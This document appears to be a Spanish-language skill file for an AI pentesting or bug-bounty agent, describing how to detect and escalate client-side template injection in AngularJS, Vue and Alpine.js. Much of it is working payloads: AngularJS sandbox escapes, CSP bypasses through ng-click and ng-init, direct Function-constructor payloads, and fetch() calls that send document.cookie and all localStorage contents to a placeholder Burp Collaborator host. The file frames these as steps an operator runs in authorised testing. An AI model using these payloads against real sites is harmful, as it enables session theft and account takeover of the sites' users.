---
name: csti
description: Detecta y escala Client-Side Template Injection — input de usuario
  evaluado como expresión de template por AngularJS, Vue, Alpine u otros frameworks
  client-side. El impacto final es XSS con ejecución en el origen del target. Skill
  standalone con su propio evidence gate.
sources: internal (built from scratch, evidence-gate-first)
---

## Qué es esto y qué NO es

Client-Side Template Injection (CSTI) ocurre cuando un framework de templates del
lado del cliente (AngularJS, Vue, Alpine) evalúa input del usuario como una expresión
de template en vez de tratarlo como texto. El resultado es ejecución de JS arbitrario
en el origen del target — funcionalmente equivalente a XSS DOM-based, pero el
vector de entrada es la sintaxis del template engine, no un sink HTML clásico.

**Lo que este skill NO cubre:**
- **Server-Side Template Injection (SSTI)** — si el template se evalúa en el servidor
  (Jinja2, Twig, Freemarker, etc.) y la response contiene el resultado ya evaluado,
  el impacto es RCE server-side, no XSS. Señal: `{{7*7}}` devuelve `49` pero el
  framework del cliente no está presente en el DOM. Documentar como SSTI y escalar
  con un skill distinto.
- **XSS reflected/stored clásico** — si el input se refleja en HTML sin pasar por
  un template engine, usar el skill `xss`. CSTI implica que hay un framework de
  templates interpretando el input.
- **Handlebars / Moustache server-side** — si el template se procesa en el servidor
  antes de enviar la respuesta, es SSTI, no CSTI.

## Señales de activación

Cargar este skill cuando en `recon.md` aparezca cualquiera de estas señales:

- Sección `## Motor de templates detectado` con AngularJS, Vue.js, o Alpine.js
- `ng-app`, `ng-controller`, `ng-model` en el DOM (AngularJS)
- `v-app`, `v-bind`, `data-v-*` en el DOM (Vue)
- `x-data`, `x-init`, `alpine` en el DOM o en JS (Alpine.js)
- Parámetros que se reflejan en posición de expresión de template (dentro de `{{}}`,
  en atributos `ng-*`, `v-*`, `x-*`)
- `{{ }}` literal visible en la página con contenido del parámetro sin evaluar
  (template no compilado — puede indicar inyección fuera del scope del compilador)

Input base: sección `## Motor de templates detectado` de `recon.md` (framework,
versión, parámetros en posición de template), sección `## Reflexión de parámetros`
(parámetros con reflejo crudo en HTML), sección `## CSP y headers de seguridad`
(directivas relevantes para la selección de payloads).

---

## Fase 1 — Detección e identificación del framework

### 1.1 — Identificar el framework y su versión desde recon.md

La versión determina el payload y si hay sandbox activo. Clasificar:

| Framework detectado | Versión | Sandbox | Evaluación |
|---|---|---|---|
| AngularJS 1.x | 1.0.x – 1.5.x | **Con sandbox** | Requiere escape de sandbox — ver payloads específicos |
| AngularJS 1.x | 1.6+ | **Sin sandbox** | Escalación directa, payloads más simples |
| Angular 2+ (≥ 2.0) | cualquiera | Sin sandbox | CSTI es muy rara — Angular 2+ compila templates en build time; el input de usuario no llega al compilador en condiciones normales. Documentar y verificar antes de continuar |
| Vue.js | 2.x / 3.x | Sin sandbox | Escalación directa a JS; Vue 3 tiene algunas restricciones adicionales |
| Alpine.js | cualquiera | Sin sandbox | Evalúa expresiones JS en atributos `x-*`; si el input llega a atributos, escalación directa |
| Handlebars / Moustache | cualquiera | No evalúan JS | Impacto limitado a HTML injection — P4 máximo, ver sección específica |

**Si la versión no está en `recon.md`:** intentar identificarla vía el código fuente
del bundle o inspeccionando `angular.version` / `Vue.version` en la consola del
browser (acción del operador). No asumir versión — el payload incorrecto puede
descartar un candidato válido.

### 1.2 — Confirmar parámetros en posición de template

El probe de detección universal es `{{7*7}}`. El operador lo inyecta en cada
parámetro identificado en `## Reflexión de parámetros` de `recon.md`.

| Resultado del probe | Interpretación |
|---|---|
| La página muestra `49` | **CSTI confirmado** — el template engine evaluó la expresión. Pasar a Fase 2 |
| La página muestra `{{7*7}}` literal | No vulnerable en este parámetro — el input no llega al compilador del template, o hay escaping. Documentar y continuar con el siguiente parámetro |
| La página muestra vacío o el parámetro desaparece | El framework evaluó la expresión pero el resultado fue `undefined` — posible CSTI, refinar el probe |
| Error en consola JS (`[$parse:lexerr]` en Angular, similar en Vue) | El template engine procesó el input pero lo rechazó como expresión inválida — hay evaluación aunque no haya output visible. Continuar con payloads específicos por framework |
| La página muestra `49` pero el framework no está en el DOM | **Posible SSTI** — el template se evaluó en el server. Documentar como candidato SSTI, no continuar con este skill |

**El probe `{{7*7}}` lo ejecuta el operador — el agente no lo ejecuta.** Documentar
en `leads.md` el resultado exacto para cada parámetro probado.

### 1.3 — Revisar CSP activa (sección `## CSP y headers de seguridad`)

La CSP afecta qué payloads funcionan. Registrar:

| Directiva CSP | Impacto en CSTI |
|---|---|
| `script-src 'unsafe-eval'` presente | `eval()` y `Function()` permitidos — todos los payloads funcionan |
| `script-src` sin `unsafe-eval` | Payloads que usan `Function()` o `eval()` bloqueados — ver variantes por framework |
| `script-src` con el CDN de AngularJS en la whitelist | Aunque `unsafe-eval` esté ausente, AngularJS en la whitelist puede explotarse via template injection + `ng-click` — ver Cadena C |
| Sin CSP | Sin restricciones — todos los payloads aplican |

Documentar las directivas relevantes antes de elegir el payload en Fase 2.

---

## Fase 2 — Escalación por framework

El agente selecciona la subsección correspondiente al framework identificado en 1.1.
No ejecutar nada — documentar los payloads para que el operador los pruebe.

### AngularJS 1.x — Con sandbox (versiones 1.0.x – 1.5.x)

El sandbox de AngularJS bloquea acceso a `window`, `document`, y constructores
nativos desde expresiones de template. Los escapes funcionan encontrando un
camino hasta `Function` que el sandbox no intercepte.

**Payload vía `orderBy` (funciona en múltiples versiones 1.x con sandbox):**

```
{{[123]|orderBy:'[].constructor.from([1],alert)'}}
```

Si el reflejo es un query param: inyectar en la URL como `?param={{[123]|orderBy:'[].constructor.from([1],alert)'}}`.

**Payload vía `$eval` (versiones más antiguas):**

```
{{$eval.constructor('alert(document.domain)')()}}
```

**Si hay CSP activa sin `unsafe-eval` pero AngularJS está en la whitelist de `script-src`** (ej: `ajax.googleapis.com`, `cdnjs.cloudflare.com`):

Requiere **HTML injection en el body** — el input debe reflejarse como HTML interpretado
por el browser, no en un atributo de texto plano. Verificar en `## Reflexión de parámetros`
de `recon.md` si el reflejo es en body o en atributo antes de aplicar estos payloads.

Los payloads varían por browser porque `$event.path` no existe en Firefox:

**Chrome — vía `$event.path` (requiere click del usuario):**
```html
<div ng-click="$event.path|orderBy:'[].constructor.from([1],alert)'">click</div>
```

**Firefox — vía `$event.composedPath()` (requiere click del usuario):**
```html
<div ng-click="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">click</div>
```

**Variante agnóstica de browser — vía `currentTarget` (requiere click del usuario):**
```html
<div ng-click="$event.currentTarget.ownerDocument.defaultView.alert(document.domain)">click</div>
```
Esta variante no depende de `path` ni `composedPath` — funciona en Chrome y Firefox.
Usarla como primer intento si el browser del operador no está definido.

**Ejecución automática sin interacción del usuario — vía `ng-init` (no requiere click):**
```html
<div ng-app ng-csp ng-init="$event.path|orderBy:'[].constructor.from([1],alert)'"></div>
```
El atributo `ng-csp` le indica a AngularJS que opere en modo CSP (sin `eval`). El
`ng-init` se evalúa al cargar la página — no requiere interacción. Notas:
- `$event` no está disponible en `ng-init` fuera de un handler de evento — ajustar
  con un gadget alternativo si el payload no dispara. Variante más portable:
  ```html
  <div ng-app ng-csp ng-init="x=[].constructor.from('alert\x28document.domain\x29');x[0].constructor.constructor(x.join(''))()"></div>
  ```
- Requiere que `ng-app` esté en el elemento inyectado o en un ancestro no controlado
  por el target. Si el DOM ya tiene `ng-app` en otro elemento, AngularJS puede
  ignorar el nuevo `ng-app` — documentar si aplica.

**Resumen de interacción requerida por payload:**

| Payload | Browser | Interacción |
|---|---|---|
| `$event.path\|orderBy:...` en `ng-click` | Chrome | Click del usuario |
| `$event.composedPath()\|orderBy:...` en `ng-click` | Firefox | Click del usuario |
| `$event.currentTarget.ownerDocument...` en `ng-click` | Chrome + Firefox | Click del usuario |
| `ng-init` con gadget alternativo | Chrome + Firefox | Ninguna — auto en page load |

**Documentar en el PoC con qué browser se confirmó el payload.** Un payload
confirmado en Chrome puede fallar en Firefox por la ausencia de `$event.path` y
viceversa. Incluir en `leads.md`: browser de confirmación, si requirió interacción,
y la directiva exacta de CSP del target que motivó el uso de este vector.

### AngularJS 1.6+ — Sin sandbox

Sin sandbox, el acceso a `Function` es directo:

**Payload estándar:**

```
{{constructor.constructor('alert(document.domain)')()}}
```

**Variante con `$on`:**

```
{{$on.constructor('alert(document.domain)')()}}
```

Si el primero no funciona (por el contexto del scope), probar el segundo. Documentar
cuál funciona para incluirlo en el PoC final de Fase 3.

**Si hay CSP sin `unsafe-eval`:** `constructor.constructor` llama a `Function()`,
que está bloqueado por `unsafe-eval`. En ese caso:

```
{{[1].join.constructor('alert(document.domain)')()}}
```

Si la CSP también bloquea esto, documentar como BLOQUEADO por CSP con killer:
`"CSP sin unsafe-eval bloquea Function() — sin path alternativo identificado para
versión [X] sin sandbox"`.

### Vue.js 2.x / 3.x

Vue no tiene sandbox — el acceso al constructor de funciones es directo.

**Payload estándar (Vue 2 y Vue 3):**

```
{{this.constructor.constructor('alert(document.domain)')()}}
```

**Si `this` no está disponible en el contexto (Vue 3 con Composition API):**

```
{{_Vue.h.constructor('alert(document.domain)')()}}
```

**Si hay CSP sin `unsafe-eval`:** Vue internamente usa `new Function()` para
compilar templates dinámicos — si el input llega a un template dinámico, Vue
puede no compilarlo con CSP estricta. Documentar como BLOQUEADO por CSP si
el payload no ejecuta, con killer: `"Vue + CSP sin unsafe-eval — compilación
de template dinámica bloqueada"`.

### Alpine.js

Alpine evalúa expresiones JS directamente en atributos `x-*`. Si el input llega
a un atributo `x-init` o `x-data`, la evaluación es inmediata al cargar la página.

**Payload vía atributo `x-init`:**

```html
<div x-init="alert(document.domain)"></div>
```

**Payload si el input llega a `x-data`:**

```html
<div x-data="{ init() { alert(document.domain) } }" x-init="init()"></div>
```

Si el reflejo es en body (no en atributo), Alpine necesita parsear el DOM con el
nuevo contenido — verificar si Alpine re-procesa el DOM dinámicamente tras el
reflejo. Documentar si es estático (carga inicial) o dinámico (re-render).

### Handlebars / Moustache

Handlebars y Moustache **no evalúan JS** — `{{7*7}}` devuelve `{{7*7}}` o el
literal sin procesar. El riesgo es HTML injection si el output del template no
está correctamente escapado, pero no hay path directo a ejecución de JS.

**Clasificación:**
- Si el output está escapado (Handlebars lo hace por default): Informational — sin impacto.
- Si hay `{{{input}}}` (triple llave, sin escape) o `Handlebars.SafeString`: HTML injection
  posible → cruzar con `xss` para el sink específico.

**Techo de severidad:** P4 sin path a JS execution. No escalar sin evidencia de que
el output llega a un sink HTML sin escapar.

---

## Fase 3 — PoC final

**El agente NO ejecuta ningún payload.** Genera el PoC documentado para que el
operador lo pruebe en su browser.

### Payload de confirmación (primer paso obligatorio)

```
{{alert(document.domain)}}
```

Para AngularJS con sandbox: usar el payload de escape de la sección correspondiente.

El `alert(document.domain)` confirma dos cosas: que el JS se ejecuta Y que corre
en el origen del target (no en el del atacante). Si el alert muestra el dominio
del atacante, el sink está en el frame equivocado — revisar el circuito.

**El operador confirma el alert antes de pasar al payload de escalación.**

### Payload de escalación — exfiltración de sesión

Solo ejecutar si el operador confirmó el alert de detección:

**Exfiltración de cookies:**

```javascript
// Reemplazar el alert(...) del payload confirmado con:
fetch('https://COLLABORATOR.burpcollaborator.net/csti?c='+encodeURIComponent(document.cookie))
```

**Exfiltración de localStorage (cruzar con `web-storage` si hay tokens):**

```javascript
fetch('https://COLLABORATOR.burpcollaborator.net/csti?l='+encodeURIComponent(JSON.stringify(Object.fromEntries(Object.keys(localStorage).map(k=>[k,localStorage.getItem(k)])))))
```

**Exfiltración del token de sesión si está en un header Authorization (no en cookie):**
Si el token se guarda en `localStorage` y se adjunta manualmente en JS, está en
storage — usar el payload de localStorage. Si está en una cookie `HttpOnly`, no
es accesible desde JS — documentar como no exfiltrable desde CSTI y bajar el
impacto según corresponda.

### Formato del PoC en leads.md

Documentar para cada parámetro vulnerable:

```
URL: https://[TARGET]/[PATH]?[PARAM]=[PAYLOAD_URL_ENCODED]
Framework: [AngularJS 1.6+ / Vue 2.x / Alpine / etc.]
Payload confirmado: [exactamente el payload que ejecutó el alert]
Resultado del alert: [dominio que mostró]
Payload de escalación: [payload de exfil con Collaborator completado]
Callback recibido: [pendiente de operador]
```

---

## Gate de evidencia — techo de severidad

| Evidencia | Techo |
|---|---|
| Framework con templates detectado + parámetro en posición de template en `recon.md` | **P4** — señal estructural, sin ejecución confirmada |
| `{{7*7}}` devuelve `49` confirmado por operador | **P3** — evaluación de template confirmada, sin ejecución de JS todavía |
| `alert(document.domain)` ejecutado en el origen del target | **P2** — XSS via CSTI confirmado |
| Cookies o tokens de sesión exfiltrados vía Collaborator | **P1/P2** según alcance — ATO posible |

**Nunca reportar por encima de P4 sin que el operador haya confirmado el probe
`{{7*7}}` → `49` en el browser.** La presencia del framework en el DOM no implica
que el input llegue al compilador.

---

## Qué mata el lead

- **El reflejo está fuera del scope del compilador de templates** — AngularJS y Vue
  solo compilan el DOM dentro del elemento raíz del app (`ng-app`, `#app`). Si el
  parámetro se refleja fuera de ese elemento, el template engine no lo procesa.
  Killer: `"reflejo en [selector] — fuera del scope de ng-app/[id del mount point]"`.
- **Angular 2+ en modo strict** — Angular 2+ compila templates en build time (AOT).
  El input de usuario no llega al compilador en condiciones normales. CSTI requiere
  que haya un `ComponentFactory` o `JitCompiler` llamado en runtime con input
  controlable — raro y requiere evidencia específica. Killer: `"Angular 2+ AOT —
  sin compilación dinámica de templates en runtime observable"`.
- **CSP sin `unsafe-eval` y sin path alternativo** — documentar exactamente qué
  directiva bloquea el payload y por qué no hay bypass conocido para esa combinación
  de framework + versión + CSP.
- **Handlebars/Moustache con output escapado** — sin `{{{triple llave}}}` ni
  `SafeString`, el output está escapado por default. Killer: `"Handlebars con
  escaping default — sin path a JS execution"`.
- **Sandbox de AngularJS 1.x sin escape conocido para esa versión exacta** —
  documentar la versión y los payloads probados. No descartar sin verificar los
  bypasses de la versión específica.

Documentar el killer con la versión exacta del framework y la razón técnica — no
"Angular sin sandbox" genérico si la versión no está confirmada.

---

## Encadenamiento

- **CSTI + tokens en localStorage** → si hay CSTI confirmado y tokens en
  `localStorage` (detectados via `web-storage`), la exfiltración de storage es
  el payload de escalación natural. Cruzar con `web-storage` y documentar la
  cadena.
- **CSTI + CORS misconfiguration** → si el target tiene CORS que permite lectura
  cross-origin, la exfiltración de datos via el JS inyectado puede aprovechar esa
  permisividad para mandar datos a un origen controlado. Cruzar con `cors`.
- **CSTI stored** → si el payload se persiste en la base de datos y se renderiza
  para otros usuarios (comentarios, perfil, nombre de usuario), el impacto escala
  a stored XSS — afecta a múltiples víctimas sin interacción adicional. Escalar
  siguiendo la lógica de `xss` (stored).
- **AngularJS en CDN whitelist de CSP** → si la CSP lista el CDN de AngularJS
  como fuente confiable, el bypass es posible via un endpoint JSONP en ese CDN.
  Documentar el CDN específico y el endpoint de bypass conocido.

Al documentar cualquier hallazgo de este skill, correr `chain_analysis.md`
Parte 2 para ese tipo de hallazgo antes de cerrar el lead.

---

## Related Skills & Chains

- **`xss`** — el impacto final de CSTI es XSS. Si el probe confirma ejecución de
  JS, el hallazgo se documenta con la misma severidad y framework que `xss` stored
  o reflected según cómo persista el input. El gate de confirmación (`alert(document.domain)`
  ejecutado) es el mismo que `xss`.
- **`web-storage`** — si hay tokens de sesión en `localStorage` y CSTI está
  confirmado, la exfiltración de storage es el payload de escalación directo.
  Consultar `web-storage` para el inventario de keys antes de armar el payload.
- **`cors`** — CORS permisivo en el mismo target facilita la exfiltración del JS
  inyectado hacia un origen controlado. Si hay ambas señales en `recon.md`, cruzar.
- **`hunt-csrf`** — si el JS inyectado puede leer el CSRF token de la página y
  usarlo en un request state-changing, la cadena CSTI → CSRF token exfil → acción
  privilegiada es equivalente a la Cadena D de `cors`. Documentar si el token
  es accesible desde el DOM.
